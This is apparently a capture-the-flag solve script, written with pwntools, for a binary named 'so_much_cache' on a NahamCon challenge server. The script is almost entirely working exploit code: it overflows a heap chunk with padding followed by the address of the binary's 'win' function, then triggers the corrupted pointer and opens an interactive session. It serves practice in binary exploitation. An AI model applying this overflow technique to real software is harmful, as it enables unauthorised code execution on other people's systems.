#!/usr/bin/python3
from pwn import *
gs = '''
b *0x400C53
continue
'''
elf = context.binary = ELF('./so_much_cache')
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./so_much_cache', gdbscript=gs)
    if args.REMOTE:
        return remote('challenge.nahamcon.com', 32340)
    else:
        return process('./so_much_cache')
r = start()

def allocate(size, data):
    r.sendline(b"1")
    r.sendlineafter(b"size :", str(size).encode('ascii'))
    r.sendlineafter(b" data :", data)
    r.recvuntil(b"[1-5] :")

def free():
    r.sendline(b"2")
    r.recvuntil(b"[1-5] :")

def exit():
    r.sendline(b"3")
    r.recvuntil(b"[1-5] :")

def prepare():
    r.sendline(b"4")
    r.recvuntil(b"[1-5] :")

def jump(option):
    r.sendline(b"5")
    r.sendlineafter(b"(1, 2, or 3)", str(option).encode("ascii"))
    
#========= exploit here ===================
allocate(0x18, b"A"*0x18)
allocate(0x18, b"B"*0x18)
allocate(0x18, b"C"*0x18)
allocate(0x18, b"D"*0x18)
allocate(0x18, b"E"*0x28+p64(elf.sym.win)) #gg
prepare()
jump(2)
#========= interactive ====================
r.interactive()
